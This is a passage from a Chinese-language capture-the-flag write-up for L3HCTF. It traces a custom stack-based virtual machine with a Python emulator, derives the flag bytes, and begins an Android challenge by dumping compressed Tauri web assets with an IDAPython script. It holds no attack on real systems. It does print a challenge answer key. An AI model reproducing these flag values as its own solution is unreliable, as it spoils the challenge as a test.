class="hljs-subst">&#123;v:X&#125;</span>&quot;</span>)<br>            sp += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">elif</span> opcode == <span class="hljs-number">7</span>:<br>            <span class="hljs-comment"># ADD</span><br>            b = stack_data[sp - <span class="hljs-number">1</span>]<br>            a = stack_data[sp - <span class="hljs-number">2</span>]<br>            sp -= <span class="hljs-number">2</span><br>            stack_data[sp] = a + b<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tstack_data[<span class="hljs-subst">&#123;sp&#125;</span>] = a + b = stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">2</span>&#125;</span>] + stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">1</span>&#125;</span>] = 0x<span class="hljs-subst">&#123;a + b:X&#125;</span>&quot;</span>)<br>            sp += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">elif</span> opcode == <span class="hljs-number">8</span>:<br>            <span class="hljs-comment"># SUB a - b</span><br>            b = stack_data[sp - <span class="hljs-number">1</span>]<br>            a = stack_data[sp - <span class="hljs-number">2</span>]<br>            sp -= <span class="hljs-number">2</span><br>            stack_data[sp] = a - b<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tstack_data[<span class="hljs-subst">&#123;sp&#125;</span>] = a - b = stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">2</span>&#125;</span>] - stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">1</span>&#125;</span>] = 0x<span class="hljs-subst">&#123;a - b:X&#125;</span>&quot;</span>)<br>            sp += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">elif</span> opcode == <span class="hljs-number">14</span>:<br>            <span class="hljs-comment"># XOR</span><br>            b = stack_data[sp - <span class="hljs-number">1</span>]<br>            a = stack_data[sp - <span class="hljs-number">2</span>]<br>            sp -= <span class="hljs-number">2</span><br>            stack_data[sp] = a ^ b<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tstack_data[<span class="hljs-subst">&#123;sp&#125;</span>] = a ^ b = stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">2</span>&#125;</span>] ^ stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">1</span>&#125;</span>] = 0x<span class="hljs-subst">&#123;a ^ b:X&#125;</span>&quot;</span>)<br>            sp += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">elif</span> opcode == <span class="hljs-number">15</span>:<br>            <span class="hljs-comment"># EQ</span><br>            b = stack_data[sp - <span class="hljs-number">1</span>]<br>            a = stack_data[sp - <span class="hljs-number">2</span>]<br>            sp -= <span class="hljs-number">2</span><br>            result = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> a == b <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>            stack_data[sp] = result<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tstack_data[<span class="hljs-subst">&#123;sp&#125;</span>] = (a == b) = stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">2</span>&#125;</span>] == stack_data[<span class="hljs-subst">&#123;sp0 - <span class="hljs-number">1</span>&#125;</span>] = 0x<span class="hljs-subst">&#123;result:X&#125;</span>&quot;</span>)<br>            sp += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">elif</span> opcode == <span class="hljs-number">16</span>:<br>            <span class="hljs-comment"># VERIFY</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\t=== VERIFY cipher check ===&quot;</span>)<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>                expected = cipher[j] - <span class="hljs-number">20</span><br>                actual = stack_data[j]<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;    stack[<span class="hljs-subst">&#123;j:2d&#125;</span>]=0x<span class="hljs-subst">&#123;actual:X&#125;</span> vs cipher[<span class="hljs-subst">&#123;j:2d&#125;</span>]-20=0x<span class="hljs-subst">&#123;expected:X&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;✅ Verification complete.&quot;</span>)<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 假设验证后程序结束</span><br><br>        <span class="hljs-keyword">elif</span> opcode == <span class="hljs-number">18</span>:<br>            <span class="hljs-comment"># JZ</span><br>            c = stack_data[sp - <span class="hljs-number">1</span>]<br>            sp -= <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tJZ if top==0 jump to <span class="hljs-subst">&#123;arg&#125;</span> (top=0x<span class="hljs-subst">&#123;c:X&#125;</span>)&quot;</span>)<br>            <span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>                i = arg * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>  <span class="hljs-comment"># 跳转到指定指令位置</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[IP=<span class="hljs-subst">&#123;i // <span class="hljs-number">2</span>&#125;</span>]\tUNKNOWN OPCODE <span class="hljs-subst">&#123;opcode&#125;</span>, abort&quot;</span>)<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br><br>        i += <span class="hljs-number">2</span>  <span class="hljs-comment"># 下一条指令</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>过程：</p><p>每一步操作都是基于栈的，利用这三种运算<strong>异或（opcode&#x3D;14）</strong>、<strong>加法（opcode&#x3D;7）</strong>、<strong>减法（opcode&#x3D;8）</strong>，</p><p><em><strong>stack [2] 的生成为例（对应目标 t2）</strong></em></p><p>用户输入即co_consts的内容为x0-x15</p><p>步骤：</p><ul><li><p>[IP&#x3D;6]    加载 x2 到栈     stack[2] &#x3D; 0xFA &#x3D; x2；</p></li><li><p>[IP&#x3D;7]    加载 x1 到栈     stack[3] &#x3D; 0xC8 &#x3D; x1；</p></li><li><p>[IP&#x3D;8]    异或                   stack[2] &#x3D; stack[2]  ^ stack[3] &#x3D; x2 ^ x1；</p></li><li><p>[IP&#x3D;9]    加载 0到栈        stack[3] &#x3D; 0x0；</p></li><li><p>[IP&#x3D;10]   减法                  stack[2] &#x3D; stack[2] - stack[3]  &#x3D; stack[2] - 0  &#x3D; x2 ^ x1 。</p><p>需要满足x2 ^ x1 &#x3D; t2</p></li></ul><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[IP=0]</span>stack_data<span class="hljs-comment">[0]</span> = co_consts<span class="hljs-comment">[0]</span> = 0xB0<br><span class="hljs-comment">[IP=1]</span>stack_data<span class="hljs-comment">[1]</span> = co_consts<span class="hljs-comment">[1]</span> = 0xC8<br><span class="hljs-comment">[IP=2]</span>stack_data<span class="hljs-comment">[2]</span> = co_consts<span class="hljs-comment">[0]</span> = 0xB0<br><span class="hljs-comment">[IP=3]</span>stack_data<span class="hljs-comment">[1]</span> = a ^ b = stack_data<span class="hljs-comment">[1]</span> ^ stack_data<span class="hljs-comment">[2]</span> = 0x78<br><span class="hljs-comment">[IP=4]</span>stack_data<span class="hljs-comment">[2]</span> = co_consts<span class="hljs-comment">[16]</span> = 0x0<br><span class="hljs-comment">[IP=5]</span>stack_data<span class="hljs-comment">[1]</span> = a - b = stack_data<span class="hljs-comment">[1]</span> - stack_data<span class="hljs-comment">[2]</span> = 0x78<br><span class="hljs-comment">[IP=6]</span>stack_data<span class="hljs-comment">[2]</span> = co_consts<span class="hljs-comment">[2]</span> = 0xFA<br><span class="hljs-comment">[IP=7]</span>stack_data<span class="hljs-comment">[3]</span> = co_consts<span class="hljs-comment">[1]</span> = 0xC8<br><span class="hljs-comment">[IP=8]</span>stack_data<span class="hljs-comment">[2]</span> = a ^ b = stack_data<span class="hljs-comment">[2]</span> ^ stack_data<span class="hljs-comment">[3]</span> = 0x32<br><span class="hljs-comment">[IP=9]</span>stack_data<span class="hljs-comment">[3]</span> = co_consts<span class="hljs-comment">[17]</span> = 0x0<br><span class="hljs-comment">[IP=10]</span>stack_data<span class="hljs-comment">[2]</span> = a - b = stack_data<span class="hljs-comment">[2]</span> - stack_data<span class="hljs-comment">[3]</span> = 0x32<br><span class="hljs-comment">[IP=11]</span>stack_data<span class="hljs-comment">[3]</span> = co_consts<span class="hljs-comment">[3]</span> = 0x86<br><span class="hljs-comment">[IP=12]</span>stack_data<span class="hljs-comment">[4]</span> = co_consts<span class="hljs-comment">[2]</span> = 0xFA<br><span class="hljs-comment">[IP=13]</span>stack_data<span class="hljs-comment">[3]</span> = a ^ b = stack_data<span class="hljs-comment">[3]</span> ^ stack_data<span class="hljs-comment">[4]</span> = 0x7C<br><span class="hljs-comment">[IP=14]</span>stack_data<span class="hljs-comment">[4]</span> = co_consts<span class="hljs-comment">[18]</span> = 0x0<br><span class="hljs-comment">[IP=15]</span>stack_data<span class="hljs-comment">[3]</span> = a + b = stack_data<span class="hljs-comment">[3]</span> + stack_data<span class="hljs-comment">[4]</span> = 0x7C<br><span class="hljs-comment">[IP=16]</span>stack_data<span class="hljs-comment">[4]</span> = co_consts<span class="hljs-comment">[4]</span> = 0x6E<br><span class="hljs-comment">[IP=17]</span>stack_data<span class="hljs-comment">[5]</span> = co_consts<span class="hljs-comment">[3]</span> = 0x86<br><span class="hljs-comment">[IP=18]</span>stack_data<span class="hljs-comment">[4]</span> = a ^ b = stack_data<span class="hljs-comment">[4]</span> ^ stack_data<span class="hljs-comment">[5]</span> = 0xE8<br><span class="hljs-comment">[IP=19]</span>stack_data<span class="hljs-comment">[5]</span> = co_consts<span class="hljs-comment">[19]</span> = 0x0<br><span class="hljs-comment">[IP=20]</span>stack_data<span class="hljs-comment">[4]</span> = a + b = stack_data<span class="hljs-comment">[4]</span> + stack_data<span class="hljs-comment">[5]</span> = 0xE8<br><span class="hljs-comment">[IP=21]</span>stack_data<span class="hljs-comment">[5]</span> = co_consts<span class="hljs-comment">[5]</span> = 0x8F<br><span class="hljs-comment">[IP=22]</span>stack_data<span class="hljs-comment">[6]</span> = co_consts<span class="hljs-comment">[4]</span> = 0x6E<br><span class="hljs-comment">[IP=23]</span>stack_data<span class="hljs-comment">[5]</span> = a ^ b = stack_data<span class="hljs-comment">[5]</span> ^ stack_data<span class="hljs-comment">[6]</span> = 0xE1<br><span class="hljs-comment">[IP=24]</span>stack_data<span class="hljs-comment">[6]</span> = co_consts<span class="hljs-comment">[20]</span> = 0x0<br><span class="hljs-comment">[IP=25]</span>stack_data<span class="hljs-comment">[5]</span> = a - b = stack_data<span class="hljs-comment">[5]</span> - stack_data<span class="hljs-comment">[6]</span> = 0xE1<br><span class="hljs-comment">[IP=26]</span>stack_data<span class="hljs-comment">[6]</span> = co_consts<span class="hljs-comment">[6]</span> = 0xAF<br><span class="hljs-comment">[IP=27]</span>stack_data<span class="hljs-comment">[7]</span> = co_consts<span class="hljs-comment">[5]</span> = 0x8F<br><span class="hljs-comment">[IP=28]</span>stack_data<span class="hljs-comment">[6]</span> = a ^ b = stack_data<span class="hljs-comment">[6]</span> ^ stack_data<span class="hljs-comment">[7]</span> = 0x20<br><span class="hljs-comment">[IP=29]</span>stack_data<span class="hljs-comment">[7]</span> = co_consts<span class="hljs-comment">[21]</span> = 0x0<br><span class="hljs-comment">[IP=30]</span>stack_data<span class="hljs-comment">[6]</span> = a + b = stack_data<span class="hljs-comment">[6]</span> + stack_data<span class="hljs-comment">[7]</span> = 0x20<br><span class="hljs-comment">[IP=31]</span>stack_data<span class="hljs-comment">[7]</span> = co_consts<span class="hljs-comment">[7]</span> = 0xBF<br><span class="hljs-comment">[IP=32]</span>stack_data<span class="hljs-comment">[8]</span> = co_consts<span class="hljs-comment">[6]</span> = 0xAF<br><span class="hljs-comment">[IP=33]</span>stack_data<span class="hljs-comment">[7]</span> = a ^ b = stack_data<span class="hljs-comment">[7]</span> ^ stack_data<span class="hljs-comment">[8]</span> = 0x10<br><span class="hljs-comment">[IP=34]</span>stack_data<span class="hljs-comment">[8]</span> = co_consts<span class="hljs-comment">[22]</span> = 0x0<br><span class="hljs-comment">[IP=35]</span>stack_data<span class="hljs-comment">[7]</span> = a + b = stack_data<span class="hljs-comment">[7]</span> + stack_data<span class="hljs-comment">[8]</span> = 0x10<br><span class="hljs-comment">[IP=36]</span>stack_data<span class="hljs-comment">[8]</span> = co_consts<span class="hljs-comment">[8]</span> = 0xC9<br><span class="hljs-comment">[IP=37]</span>stack_data<span class="hljs-comment">[9]</span> = co_consts<span class="hljs-comment">[7]</span> = 0xBF<br><span class="hljs-comment">[IP=38]</span>stack_data<span class="hljs-comment">[8]</span> = a ^ b = stack_data<span class="hljs-comment">[8]</span> ^ stack_data<span class="hljs-comment">[9]</span> = 0x76<br><span class="hljs-comment">[IP=39]</span>stack_data<span class="hljs-comment">[9]</span> = co_consts<span class="hljs-comment">[23]</span> = 0x0<br><span class="hljs-comment">[IP=40]</span>stack_data<span class="hljs-comment">[8]</span> = a + b = stack_data<span class="hljs-comment">[8]</span> + stack_data<span class="hljs-comment">[9]</span> = 0x76<br><span class="hljs-comment">[IP=41]</span>stack_data<span class="hljs-comment">[9]</span> = co_consts<span class="hljs-comment">[9]</span> = 0x64<br><span class="hljs-comment">[IP=42]</span>stack_data<span class="hljs-comment">[10]</span> = co_consts<span class="hljs-comment">[8]</span> = 0xC9<br><span class="hljs-comment">[IP=43]</span>stack_data<span class="hljs-comment">[9]</span> = a ^ b = stack_data<span class="hljs-comment">[9]</span> ^ stack_data<span class="hljs-comment">[10]</span> = 0xAD<br><span class="hljs-comment">[IP=44]</span>stack_data<span class="hljs-comment">[10]</span> = co_consts<span class="hljs-comment">[24]</span> = 0x0<br><span class="hljs-comment">[IP=45]</span>stack_data<span class="hljs-comment">[9]</span> = a + b = stack_data<span class="hljs-comment">[9]</span> + stack_data<span class="hljs-comment">[10]</span> = 0xAD<br><span class="hljs-comment">[IP=46]</span>stack_data<span class="hljs-comment">[10]</span> = co_consts<span class="hljs-comment">[10]</span> = 0xD7<br><span class="hljs-comment">[IP=47]</span>stack_data<span class="hljs-comment">[11]</span> = co_consts<span class="hljs-comment">[9]</span> = 0x64<br><span class="hljs-comment">[IP=48]</span>stack_data<span class="hljs-comment">[10]</span> = a ^ b = stack_data<span class="hljs-comment">[10]</span> ^ stack_data<span class="hljs-comment">[11]</span> = 0xB3<br><span class="hljs-comment">[IP=49]</span>stack_data<span class="hljs-comment">[11]</span> = co_consts<span class="hljs-comment">[25]</span> = 0x0<br><span class="hljs-comment">[IP=50]</span>stack_data<span class="hljs-comment">[10]</span> = a + b = stack_data<span class="hljs-comment">[10]</span> + stack_data<span class="hljs-comment">[11]</span> = 0xB3<br><span class="hljs-comment">[IP=51]</span>stack_data<span class="hljs-comment">[11]</span> = co_consts<span class="hljs-comment">[11]</span> = 0xC3<br><span class="hljs-comment">[IP=52]</span>stack_data<span class="hljs-comment">[12]</span> = co_consts<span class="hljs-comment">[10]</span> = 0xD7<br><span class="hljs-comment">[IP=53]</span>stack_data<span class="hljs-comment">[11]</span> = a ^ b = stack_data<span class="hljs-comment">[11]</span> ^ stack_data<span class="hljs-comment">[12]</span> = 0x14<br><span class="hljs-comment">[IP=54]</span>stack_data<span class="hljs-comment">[12]</span> = co_consts<span class="hljs-comment">[26]</span> = 0x0<br><span class="hljs-comment">[IP=55]</span>stack_data<span class="hljs-comment">[11]</span> = a + b = stack_data<span class="hljs-comment">[11]</span> + stack_data<span class="hljs-comment">[12]</span> = 0x14<br><span class="hljs-comment">[IP=56]</span>stack_data<span class="hljs-comment">[12]</span> = co_consts<span class="hljs-comment">[12]</span> = 0xE3<br><span class="hljs-comment">[IP=57]</span>stack_data<span class="hljs-comment">[13]</span> = co_consts<span class="hljs-comment">[11]</span> = 0xC3<br><span class="hljs-comment">[IP=58]</span>stack_data<span class="hljs-comment">[12]</span> = a ^ b = stack_data<span class="hljs-comment">[12]</span> ^ stack_data<span class="hljs-comment">[13]</span> = 0x20<br><span class="hljs-comment">[IP=59]</span>stack_data<span class="hljs-comment">[13]</span> = co_consts<span class="hljs-comment">[27]</span> = 0x0<br><span class="hljs-comment">[IP=60]</span>stack_data<span class="hljs-comment">[12]</span> = a - b = stack_data<span class="hljs-comment">[12]</span> - stack_data<span class="hljs-comment">[13]</span> = 0x20<br><span class="hljs-comment">[IP=61]</span>stack_data<span class="hljs-comment">[13]</span> = co_consts<span class="hljs-comment">[13]</span> = 0xEF<br><span class="hljs-comment">[IP=62]</span>stack_data<span class="hljs-comment">[14]</span> = co_consts<span class="hljs-comment">[12]</span> = 0xE3<br><span class="hljs-comment">[IP=63]</span>stack_data<span class="hljs-comment">[13]</span> = a ^ b = stack_data<span class="hljs-comment">[13]</span> ^ stack_data<span class="hljs-comment">[14]</span> = 0xC<br><span class="hljs-comment">[IP=64]</span>stack_data<span class="hljs-comment">[14]</span> = co_consts<span class="hljs-comment">[28]</span> = 0x0<br><span class="hljs-comment">[IP=65]</span>stack_data<span class="hljs-comment">[13]</span> = a - b = stack_data<span class="hljs-comment">[13]</span> - stack_data<span class="hljs-comment">[14]</span> = 0xC<br><span class="hljs-comment">[IP=66]</span>stack_data<span class="hljs-comment">[14]</span> = co_consts<span class="hljs-comment">[14]</span> = 0x87<br><span class="hljs-comment">[IP=67]</span>stack_data<span class="hljs-comment">[15]</span> = co_consts<span class="hljs-comment">[13]</span> = 0xEF<br><span class="hljs-comment">[IP=68]</span>stack_data<span class="hljs-comment">[14]</span> = a ^ b = stack_data<span class="hljs-comment">[14]</span> ^ stack_data<span class="hljs-comment">[15]</span> = 0x68<br><span class="hljs-comment">[IP=69]</span>stack_data<span class="hljs-comment">[15]</span> = co_consts<span class="hljs-comment">[29]</span> = 0x0<br><span class="hljs-comment">[IP=70]</span>stack_data<span class="hljs-comment">[14]</span> = a + b = stack_data<span class="hljs-comment">[14]</span> + stack_data<span class="hljs-comment">[15]</span> = 0x68<br><span class="hljs-comment">[IP=71]</span>stack_data<span class="hljs-comment">[15]</span> = co_consts<span class="hljs-comment">[15]</span> = 0x0<br><span class="hljs-comment">[IP=72]</span>stack_data<span class="hljs-comment">[16]</span> = co_consts<span class="hljs-comment">[14]</span> = 0x87<br><span class="hljs-comment">[IP=73]</span>stack_data<span class="hljs-comment">[15]</span> = a ^ b = stack_data<span class="hljs-comment">[15]</span> ^ stack_data<span class="hljs-comment">[16]</span> = 0x87<br><span class="hljs-comment">[IP=74]</span>stack_data<span class="hljs-comment">[16]</span> = co_consts<span class="hljs-comment">[30]</span> = 0x0<br><span class="hljs-comment">[IP=75]</span>stack_data<span class="hljs-comment">[15]</span> = a - b = stack_data<span class="hljs-comment">[15]</span> - stack_data<span class="hljs-comment">[16]</span> = 0x87<br><span class="hljs-comment">[IP=76]</span>=== VERIFY cipher check ===<br>    stack<span class="hljs-comment">[ 0]</span>=0xB0 vs cipher<span class="hljs-comment">[ 0]</span>-20=0xDF<br>    stack<span class="hljs-comment">[ 1]</span>=0x78 vs cipher<span class="hljs-comment">[ 1]</span>-20=0x6E<br>    stack<span class="hljs-comment">[ 2]</span>=0x32 vs cipher<span class="hljs-comment">[ 2]</span>-20=0x-E<br>    stack<span class="hljs-comment">[ 3]</span>=0x7C vs cipher<span class="hljs-comment">[ 3]</span>-20=0x1E9<br>    stack<span class="hljs-comment">[ 4]</span>=0xE8 vs cipher<span class="hljs-comment">[ 4]</span>-20=0x13C<br>    stack<span class="hljs-comment">[ 5]</span>=0xE1 vs cipher<span class="hljs-comment">[ 5]</span>-20=0x24<br>    stack<span class="hljs-comment">[ 6]</span>=0x20 vs cipher<span class="hljs-comment">[ 6]</span>-20=0x9E<br>    stack<span class="hljs-comment">[ 7]</span>=0x10 vs cipher<span class="hljs-comment">[ 7]</span>-20=0xCA<br>    stack<span class="hljs-comment">[ 8]</span>=0x76 vs cipher<span class="hljs-comment">[ 8]</span>-20=0x146<br>    stack<span class="hljs-comment">[ 9]</span>=0xAD vs cipher<span class="hljs-comment">[ 9]</span>-20=0x183<br>    stack<span class="hljs-comment">[10]</span>=0xB3 vs cipher<span class="hljs-comment">[10]</span>-20=0x88<br>    stack<span class="hljs-comment">[11]</span>=0x14 vs cipher<span class="hljs-comment">[11]</span>-20=0x1C3<br>    stack<span class="hljs-comment">[12]</span>=0x20 vs cipher<span class="hljs-comment">[12]</span>-20=0x5A<br>    stack<span class="hljs-comment">[13]</span>=0xC vs cipher<span class="hljs-comment">[13]</span>-20=0x14<br>    stack<span class="hljs-comment">[14]</span>=0x68 vs cipher<span class="hljs-comment">[14]</span>-20=0x132<br>    stack<span class="hljs-comment">[15]</span>=0x87 vs cipher<span class="hljs-comment">[15]</span>-20=0x83<br><br></code></pre></td></tr></table></figure><p>最终解密代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher = [<span class="hljs-number">0xF3</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x97</span>]<br>target = [c - <span class="hljs-number">20</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cipher]<br>co_consts_fixed = [<span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x87</span>]<br><br>x = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br><br>x[<span class="hljs-number">0</span>] = target[<span class="hljs-number">0</span>]<br><br>x1_xor_x0 = target[<span class="hljs-number">1</span>] + co_consts_fixed[<span class="hljs-number">0</span>]<br>x[<span class="hljs-number">1</span>] = x1_xor_x0 ^ x[<span class="hljs-number">0</span>]<br>x1_xor_x0 = co_consts_fixed[<span class="hljs-number">0</span>] - target[<span class="hljs-number">1</span>]<br>x[<span class="hljs-number">1</span>] = x1_xor_x0 ^ x[<span class="hljs-number">0</span>]<br><br>x = [<br>    <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x4C</span>,<br>    <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x58</span><br>]<br><br><span class="hljs-comment"># 转换为32位十六进制（每个x[i]→2位，补0）</span><br>hex_str = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;num:02x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> x)<br><br><span class="hljs-comment"># 最终密码</span><br>password = <span class="hljs-string">f&quot;L3HCTF&#123;&#123;<span class="hljs-subst">&#123;hex_str&#125;</span>&#125;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确解密密码：&quot;</span>)<br><span class="hljs-built_in">print</span>(password)<br></code></pre></td></tr></table></figure><h1 id="ez-android"><a href="#ez-android" class="headerlink" title="ez_android"></a>ez_android</h1><p>这题也是花了一天多的时间才解决QAQ，真是不容易啊，还是得好好理解，多动动脑筋嘞~</p><p>直接在com目录下找到mainactivity，发现TauriActivity，不太清楚Tauri 框架是啥</p><p>在swdd的指导下先学习一下理论知识</p><hr><h2 id="TauriActivity"><a href="#TauriActivity" class="headerlink" title="TauriActivity"></a>TauriActivity</h2><p><code>TauriActivity</code> 是 Tauri 框架为 Android 平台提供的桥接 Activity 类，Tauri 是一个跨平台应用开发框架（主要用 Rust 编写），允许使用 Web 技术（HTML&#x2F;JS&#x2F;CSS） 构建前端，同时通过 Rust 后端实现逻辑。</p><p><code>TauriActivity</code> 的主要功能：</p><ol><li>提供一个 WebView 容器，加载应用前端（HTML&#x2F;JS）。</li><li>通过 JNI 调用 Rust 编译的共享库（<code>libtauri.so</code>）。</li><li>提供文件选择、权限处理、JS ↔ Rust 通信接口。</li></ol><hr><h4 id="Tauri-框架的静态资源提取方法"><a href="#Tauri-框架的静态资源提取方法" class="headerlink" title="Tauri 框架的静态资源提取方法:"></a><strong>Tauri 框架的静态资源提取方法:</strong></h4><p>先直接搜索关键词：index.html，交叉引用发现这里的包含文件名和文件位置的表</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507181759290.png" alt="image-20250718175941196"></p><p>以下代码把文件内容dump出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ida_python">import ida_bytes<br><br>addr = 0x00000000000C9498  <br>size = 0xEB                <br><br>dump = ida_bytes.get_bytes(addr, size)<br><br>file_path = r&quot;C:\Users\38489\Desktop\index_html.br&quot;<br>with open(file_path, &quot;wb&quot;) as f:<br>    f.write(dump)<br><br>print(f&quot;[+] 提取完成，文件已保存到: &#123;file_path&#125; (大小 &#123;len(dump)&#125; bytes)&quot;)<br></code></pre></td></tr></table></figure><p>由于我的idapython一直没法安装成功brotli，就先dump出来文件之后在本地解压缩</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 